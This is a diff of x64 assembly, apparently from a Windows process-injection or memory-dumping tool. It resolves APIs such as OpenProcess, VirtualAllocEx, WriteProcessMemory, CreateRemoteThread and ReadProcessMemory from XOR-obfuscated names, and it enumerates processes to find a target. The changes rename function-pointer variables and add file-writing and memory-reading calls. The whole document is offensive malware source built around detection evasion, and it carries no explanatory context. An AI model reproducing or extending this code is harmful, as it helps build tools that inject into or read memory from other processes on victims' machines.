@@ -770,7 +770,7 @@ get_proc_address_by_name:
     sub rsp, 32
     mov rcx, rbp
     sub rcx, 312
-    call [loadlibrary_addr]     ; library addr
+    call [loadlibrary]     ; library addr
     add rsp, 32
 
     mov [rbp - 328], rax        ; library addr
@@ -820,7 +820,7 @@ get_proc_address_by_get_proc_addr:
     sub rsp, 32
     mov rcx, [rbp + 16]
     mov rdx, [rbp + 24]
-    call [get_proc_addr_addr]   ; proc addr
+    call [get_proc_addr]   ; proc addr
     add rsp, 32
 
     mov [rbp - 8], rax          ; return value
@@ -906,7 +906,7 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [get_proc_addr_addr], rax           ; GetProcAddress addr
+    mov [get_proc_addr], rax           ; GetProcAddress addr
     sub rsp, 32
     mov rcx, [rbp + 16]
     mov rdx, get_last_error_xor
@@ -915,7 +915,7 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [get_last_error_addr], rax          ; GetLastError addr
+    mov [get_last_error], rax          ; GetLastError addr
 
     sub rsp, 32
     mov rcx, [rbp + 16]
@@ -925,7 +925,17 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [loadlibrary_addr], rax             ; LoadLibraryA addr
+    mov [loadlibrary], rax             ; LoadLibraryA addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, get_current_process_xor
+    mov r8, get_current_process_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [get_current_process], rax     ; GetCurrentProcess addr
 
     sub rsp, 32
     mov rcx, [rbp + 16]
@@ -935,7 +945,28 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [open_process_addr], rax            ; OpenProcess addr
+    mov [open_process], rax            ; OpenProcess addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, create_file_xor
+    mov r8, create_file_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [create_file], rax            ; CreateFile addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, write_file_xor
+    mov r8, write_file_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [write_file], rax            ; WriteFile addr
+
 
     sub rsp, 32
     mov rcx, [rbp + 16]
@@ -945,7 +976,7 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [virtual_alloc_ex_addr], rax        ; VirtualAllocEx addr
+    mov [virtual_alloc_ex], rax        ; VirtualAllocEx addr
 
     sub rsp, 32
     mov rcx, [rbp + 16]
@@ -955,7 +986,7 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [virtual_free_ex_addr], rax         ; VirtualFreeEx addr
+    mov [virtual_free_ex], rax         ; VirtualFreeEx addr
 
     sub rsp, 32
     mov rcx, [rbp + 16]
@@ -965,77 +996,17 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [virtual_protect_ex_addr], rax      ; VirtualProtectEx addr
+    mov [virtual_protect_ex], rax      ; VirtualProtectEx addr
 
     sub rsp, 32
     mov rcx, [rbp + 16]
-    mov rdx, create_remote_thread_xor
-    mov r8, create_remote_thread_xor.len
+    mov rdx, read_process_memory_xor
+    mov r8, read_process_memory_xor.len
     xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [create_remote_thread_addr], rax    ; CreateRemoteThread addr
-     
-    sub rsp, 32
-    mov rcx, [rbp + 16]
-    mov rdx, wait_for_single_object_xor
-    mov r8, wait_for_single_object_xor.len
-    xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
-    add rsp, 32
-
-    mov [wait_for_single_object_addr], rax  ; WaitForSingleObject addr
- 
-    sub rsp, 32
-    mov rcx, [rbp + 16]
-    mov rdx, close_handle_xor
-    mov r8, close_handle_xor.len
-    xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
-    add rsp, 32
-
-    mov [close_handle_addr], rax            ; CloseHandle addr
-
-    sub rsp, 32
-    mov rcx, [rbp + 16]
-    mov rdx, create_toolhelp32_snapshot_xor
-    mov r8, create_toolhelp32_snapshot_xor.len
-    xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
-    add rsp, 32
-
-    mov [create_toolhelp32_snapshot_addr], rax            ; CreateToolhelp32Snapshot addr
-
-    sub rsp, 32
-    mov rcx, [rbp + 16]
-    mov rdx, process32_first_xor
-    mov r8, process32_first_xor.len
-    xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
-    add rsp, 32
-
-    mov [process32_first_addr], rax            ; Process32First addr
-
-    sub rsp, 32
-    mov rcx, [rbp + 16]
-    mov rdx, process32_next_xor
-    mov r8, process32_next_xor.len
-    xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
-    add rsp, 32
-
-    mov [process32_next_addr], rax          ;  Process32Next addr
-
-    sub rsp, 32
-    mov rcx, [rbp + 16]
-    mov rdx, sleep_xor
-    mov r8, sleep_xor.len
-    xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
-    add rsp, 32
-
-    mov [sleep_addr], rax                   ; Sleep addr
+    mov [read_process_memory], rax      ; ReadProcessMemory addr
 
     sub rsp, 32
     mov rcx, [rbp + 16]
@@ -1045,8 +1016,78 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
-    mov [write_process_memory_addr], rax    ; WriteProcessMemory addr
-    
+    mov [write_process_memory], rax      ; WriteProcessMemory addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, create_remote_thread_xor
+    mov r8, create_remote_thread_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [create_remote_thread], rax    ; CreateRemoteThread addr
+     
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, wait_for_single_object_xor
+    mov r8, wait_for_single_object_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [wait_for_single_object], rax  ; WaitForSingleObject addr
+ 
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, close_handle_xor
+    mov r8, close_handle_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [close_handle], rax            ; CloseHandle addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, create_toolhelp32_snapshot_xor
+    mov r8, create_toolhelp32_snapshot_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [create_toolhelp32_snapshot], rax            ; CreateToolhelp32Snapshot addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, process32_first_xor
+    mov r8, process32_first_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [process32_first], rax            ; Process32First addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, process32_next_xor
+    mov r8, process32_next_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [process32_next], rax          ;  Process32Next addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, sleep_xor
+    mov r8, sleep_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [sleep], rax                   ; Sleep addr
+
 .shutdown:
     leave
     ret
@@ -1073,7 +1114,7 @@ find_target_process_id:
     sub rsp, 32
     mov rcx, TH32CS_SNAPPROCESS
     xor rdx, rdx
-    call [create_toolhelp32_snapshot_addr]  ; snapshot handle
+    call [create_toolhelp32_snapshot]  ; snapshot handle
     add rsp, 32
 
     cmp rax, INVALID_HANDLE_VALUE
@@ -1086,7 +1127,7 @@ find_target_process_id:
     mov rcx, [rbp - 16]                     ; snapshot handle
     mov rdx, rbp
     sub rdx, 580                            ; &processentry 
-    call [process32_first_addr]
+    call [process32_first]
     add rsp, 32
 
     cmp rax, 0                              ; if !process32First
@@ -1097,7 +1138,7 @@ find_target_process_id:
     mov rcx, [rbp - 16]                     ; snapshot handle
     mov rdx, rbp
     sub rdx, 580                            ; &processentry 
-    call [process32_next_addr]
+    call [process32_next]
     add rsp, 32
 
     cmp rax, 0
